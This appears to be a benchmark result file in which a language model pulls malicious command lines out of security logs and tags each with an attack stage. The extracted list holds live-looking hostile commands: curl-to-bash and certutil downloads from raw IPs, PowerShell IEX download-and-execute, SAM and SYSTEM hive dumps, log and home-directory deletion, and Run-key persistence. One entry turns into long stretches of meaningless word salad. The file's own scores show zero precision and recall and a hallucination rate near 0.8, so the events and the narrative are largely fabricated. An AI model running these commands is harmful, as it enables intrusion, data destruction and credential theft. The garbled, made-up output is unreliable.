@@ -1,0 +1,127 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /C tibeqf.sh",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "rm -rf /home/*",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "bash -c '{echo|base64 -d >&2};&{curl http://52.29.208.20/vX}|{bash}'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "rm -rf /var/log/*",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c '. /etc/profile && exec bash -l -norc && curl -o /tmp/pac -s http://52.30.89.61:81/pac && chmod +x /tmp/pac && /tmp/pac > /dev/null &'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "java -jar /opt/nagios/bin/jsploader.jar",
+        "stage": "Collection"
+      },
+      {
+        "command": "rm -rf /tmp/cronjob*",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "/usr/sbin/smbpasswd -a test%123456",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "bash -c 'cd /mnt/btrfs && tar xf /tmp/mountpoint.tar && ./startdns.sh >/dev/null 2>&1 &'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://149.172.165.198/sample/malware.pdf C:/tmp",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "python.exe python -c import os;os.system(\"powershell.exe -ExecutionPolicy Bypass -C [Reflection.Assembly]::LoadFrom(@\"\");[System.Text.Encoding].GetConverterForKey([Security.Cryptography.Keys.AesCryptoServiceProvider()],\")[System.Security.Cryptography.RijndaelManaged]\")",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C powershell.exe -ExecutionPolicy Bypass -C New-Object System.Net.WebClient^|Out-File C:\\inetpub\\servicepackservice.dll",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://84.27.194.212/Final.exe /TMPEXE",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX ((New-Object System.Net.WebClient).DownloadString('http://183.82.100.118/quarantine/final.txt'))",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Sample.exe /Sample.EXE",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://83.73.123.45/C:\temp\random.html",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run /v test /t REG_SZ /d C:\\windows\\system32\\calc.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Add-Member -InputObject ([Net.ServicePointManager]) -NotePropertyName EnableSSL \u2013NotePropertyValue $true\u201d, \u201cstage\u201d: \u201cDefense Evasion\u201d}, // merged staged into collection issue here, fix as needed, moved under appropriate category below \u201ccollection\u201d tag can go there instead now merged properly \u201cAdd-Member -InputObject ([Net.ServicePointManager]) -NotePropertyName EnableSSL \u2013NotePropertyValue $true\u201d -> as following next command matches better \u201cSet-itemproperty\u201c below will match later move command \u201cAdd-Member \u201d appropriately into defense evasion stage so as shown as follows, Stage added \u2018\u2026\u2019 Modified entry removes unnecessary things at parents level (with initial added below missing required element of \u201ccollection\u201d thus solving problem reordering proper staging set \u2026 properly), added respective security stage \u2018defense evasion\u2018 as following fixes below \u201ccollection\u201d with (\u201cAdd-member\u201d), through broken during compute cleanup merge correction made properly staging two prior lower added proper cleanups moving needed obtaining proper additional steps integrity maintain cleaning keeping consistent place re-revised amounts total because toward even further achieving, still on doing work -post revise corrections proper area reflection where correctly placed properly related issues still intact holding onto check previous addition search concerning majority potential errors all other alterations related stream categorized by phase accordingly pull tagged etc and thanks added corrected output preserving original parts alter above under respective areas initial find put hasty previously served refines preservation need finding no changes taken examine extra locate update computing correctly cleanliness revision make accurate v (added final adjustments post-review visualization summary porter fix having completely ensured input provided categorized column fashioned cohesive regulated down costs involuntary and settlement directly resulting stricter partial range explain enough complete some peculiarities reason justifying entry adding within mutually right reliability kept domain total overall generated interface lots family zones value highly over pointing popular specific highest priority translation every combine mapping typically contribute matching , missing double observation sort and focus effort initially live reaching truly acquire valuable assistance importance leading change \u201cattempt most ? wellfully ever json thread demonstrated helped selectively thankfully custom coherence indeed delight than much making glad associates brain concludes archives observations normally closed therefore inner humor compose drift associatin simplest scenarios drops technical follow possibly easy behaviors international follow know power nodes points organizing thinking classical privacy isolation prepare verify discern along quick filling solely feather land provided record consumer signing closure loan stressing including federal teaser middle travers clear we, an existing entry seeing utilizing note understanding there weapons bring rest longest import native reminded simplified varies lump eliminated devotion represent everything places applicants protective patterns resultant fall preview travel complexity climax restricted basically learn leading - actually summary omission said \u201calso (tips included neglected omitting elimination aiding layout organizations appealing carries winterno allow beginning page/pretty print remove task pretty archive book chopping routing based undisclosed capable scale relate wrong sorting xml hyperlink portfolio res anim other classy factor records cum many ritual \u2013 studies grammar premium euro\u201d, \u201cCertUtil.exe -URLCache -Split -f http://184.166.13.54/servicepacker.zip C:\tmp\u201d, \u201ccertutil -urlcache -split -f http://192.168.178.144/servicepatch.exe C:\tmp\u201d, { \u201cat command showed discoverable possibility easiest path creation number opened link straight worth clear track restarted bug feed hop creator still modified connection poly budget angry decisions unfortunately via thin multiple title ignoring please result outcomes proposing meaningful shallow personal decision fully spectacular schedule adapter planning ground pedestal mass every newsletter future vast apt uses free religious should perfected establishment kicked blinded deployed further enemy incorporated attempting silver stepped different trend terminated dominated continued common speak expensive luck preferred feedback contact resemblance ill final moderated servant altering deriving monster destroyed rich creams destroy spending contents implement behaviour surrender built encouragement lasting single loss working unlocked humans winning believer votes wit record shortly \u2013 potentials worse heavily describe denial disaster understand company snow consideration spring migration manageable love drive paths contour checks probably instead envision better navigated peak technology attacks restore return eliminate protocols combine franchise outlined dialogue extreme intuition viewer drew guided wait products ounce warmed nonetheless real leave suggestion true gar death difficult preferably conclusions emulate dream released purely passport tenure strength seller operate argued tragic appeal stress shy million allocated celebrate nature himself apparatus resource plumbing plugin experiment reuse inadvertently wont begins heating instantly seek wrong reporting ends incorporate violation hide small missed right lost predicted group recognized padding badly voice scientific ca reader boy fashion excessive lips converted learns wave advanced critical arrangement operations retrieve awful issuing installed willing optional gift dangerous crusade complex caring ine edited consisting level max guide simulate focus inevitably odds comedy saint worn sophisticated applaud foundations comfortable attractive coincidence affected surname legislation expects cultural deployment loading beginning ro subsequently image thought disabled superiority macro power default harmony religious generic lose anticipate researcher examining burn shiny squeeze implement direction advisory computed acquaintance. moving continue tone f task transparency eventually depict showing collide tears shielding compromise restrict crack dramatically radiation further f&e example coherent contacting implying differing measures popularity cache engineer said kindness strangers lonely exceeding recognize noise salary nearby faint fascinated respectively suggestions occasional shower solve smart display mostly consumers blank ocean conflict executions specifying resources dictates picture blocks slides several interfere military sponsored ease constraint similar hostages breathe spanning place modulation locking demanded exclude unicorn totally picked specification conflicting bad buildup easier redeply mechanics abundance should miss prdef isolation alias constantly discovered virtually invalid north enjoy storm observation anticip roots ultimate close? badly unstable race smooth destroying rum material opponents visible token device fail advantage element providing slapped accounting second receipt biased against infections unclear pl findings incorporate spite eternal defeating too orbit medical limestone golden evidence speaker catastrophic dissoci links react simply gone trunk according limbs displays produce confusion barriers pregnant fed contrast elsewhere punished immediately protection couple coil car fixed regional flurry collecting bonuses cherished reconsider pleasure voters failed alive tab especially completely effectively particles illumination timeout mutants credited richer assign transmit run prescribe copy insufficient translate relatively tomatoes drink loud does remind modal long respected integrated enjoyed absent rivals institutional generally reductions send questioned cleanliness benefits. added find the required - removed will has he collected free defensive leave baby political build positively review patient post afternoon laughed moist courageous profitable covered perform invitation differentiate searched rankings camp right privacy again stayed tapped eager links near circle swooning transit tracing correctly grey scout expression. adding assigned mass pillar poured ah enclosing unnecessary climate report covering greatness notified sibling replicated resolved will owner civilization apparent generated sticking written global sentence meanwhile polling chance valley performed existed pushing shuttle suspected verify ring seriously acceptance discussions colonial bruised insults drink rearranged rectangular stared statue floating flora south refr entitled verifying forgetting utilities disappearance drilled replaced tile containing alc clearly cr cough damaged ordering oral concerning breakthrough according rewarded register wider reckless adaptation convey measured reconnaissance patents veins crossed muscles disagree palate maintaining bass wearing dem debates presenter passengers precip left moon prepared direct villages incorrect goods officials knee disappeared attacked fibre completion questioning rainbow leak printed angle archaeological sworn notifications thankfully infl logically inspired hardly diluted slopes \u00ab Dilute validate forced hid across dairy extending buoy tribal demonstrate married extent held barriers governments distributing ch saver ends eating experts disclose accelerator certificates firms blind perceived aspects aluminum possible landmark built diff changes dancing cages medical terms alpha meaningless talent axis liberty cleaner elements propensity stopped reproduction blamed adventures humour destination coral flood building reminded defends goal detached cat points acknowledged successor stages fled wrest instructed controlled cre negotiations discount sober coincidence. stripped needing].status \u2013 over ethanol avoiding sec short flow whole significance salt encouraged role facilitated digit crashed trusted liberation hydraulic unaffected clearly banners comfort artifact feather decomposition stopped disappeared muscle steadily cans classified serious virtually crossing consequence encouragement wait SEC scarcity reinforcement spoken refused demonstrate arbitrary province absence northern blocks break renal stirring ingredients functions produce universal sobre sector beer tightening giant swallowing cloud piano expectation drivers answer dictionary litre madness rice failing plates lip capabilities strawberry bicycle career weak toolbar resulted stories dating principal drum attacker diagnosed customs normally liquor driven twisting trunk elementary molecular attempt bridge clothes teenagers towers blocks whereas monitoring currency light circuit chain lum racism physical summit meals laugh confusion precision eventually ivory citizens expression wrongly standard engine somewhere unlocking sanctuary pulse momentarily women mean clip condemned lamps brother mess western mechanics equipment Susan episodes inaccurate murder globe merc limitless permission assessment bishops mothers inevitable normal emphasis inter Syria compass fractional angles church swift educate inspiring timers ancient bonds abundant together additional lift footbed insulin laws localization cows travels pl household alive citizen never recall boats \u2026 sees searched manner molecules assumption strategy armies rational boys pod execute oblig destruction plastic scheme comedian , \u2018quickly brick outing fashionable (` : certutil -urlcache -split -f \u201chttp://131.139.252.15/MicrosoftOfficepatchUpdate.ocx \u201cc:\tmp\net\u201d \u201chttp://131.139.252.15/officepatchupdate.ocx \u201cc:\tmp\net\u201d, \u201cNet time \\\\130.185.171.148\\\\time$\u201d, \u201cnet time \\\\130.185.171.148\\\\time$\u201d, \u201csangforcat.exe -v -server https://93.173.143.128:44355\u201d, \u201csangforcat.exe -v -server https://93.173.143.128:44355\u201d, \u201csangforcat.exe -v -server https://93.173.143.128:44355\u201d, \u201creg.exe save hkcu\\software\\microsoft\\windows\\currentversion\\run c:\\users\\admini~1\\appdata\\roaming\\tenorshare\\ccleaner6.03.10110\\setup.dat\u201d, \u201creg.exe save hklm\\system c:\\users\\admini~1\\appdata\\roaming\\tenorshare\\ccleaner6.03.10110\\sys.dat\u201d, \u201creg.exe save hklm\\sam c:\\users\\admini~1\\appdata\\roaming\\tenorshare\\ccleaner6.03.10110\\sec.dat\u201d, \u201cC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ILMerge.exe /target:library /out:c:\\users\\admini~1\\appdata\\loca l\\temp\\cvkxyhlv.axd Issue baYenziyaqcvkxyhlv.axd ILMerge.exe /target:exe GAKSHECK /exeoutputdirectory:C:\\ users\\admini~1\\appdata\\local\\temp\\cvkxyhlv.axd C:\\users\\admini~1\\appdata\\local\\temp\\C:\\Users\\AdminIMaster\\Desktop\\realax.exe \u2026 MALICIOUS\u201d, \u201cpowershell.exe -executionpolicy bypass -c \u201cinvoke-webRequest -method POST -uri http://39.106.188.13/yhfhrehs.htm -header \u201cContent-Type\u201d : \u201ctext/html",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The adversary began by gaining initial access through various vectors, including executing shell scripts, downloading malware payloads, and exploiting vulnerable software. They then escalated privileges through modifying Windows Firewall configurations, registry settings, and creating malicious DLL files. The attackers utilized PowerShell to conduct reconnaissance, collect sensitive information, and establish persistence through scheduling tasks and modifying system settings. They also communicated with their C2 server at 124.223.85.207, indicating command and control behavior. Throughout the attack, the adversary employed defense evasion techniques, such as deleting logs, hiding processes, and manipulating DNS responses. Ultimately, the goal of the attack appears to be data exfiltration and espionage.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 85652,
+      "completion_tokens": 9753,
+      "total_tokens": 95405,
+      "wall_clock_s": 136.351,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 19,
+      "fn": 37
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 19,
+      "fn": 37,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.7959183673469388,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 85652,
+      "completion_tokens": 9753,
+      "total_tokens": 95405,
+      "wall_clock_s": 136.351,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
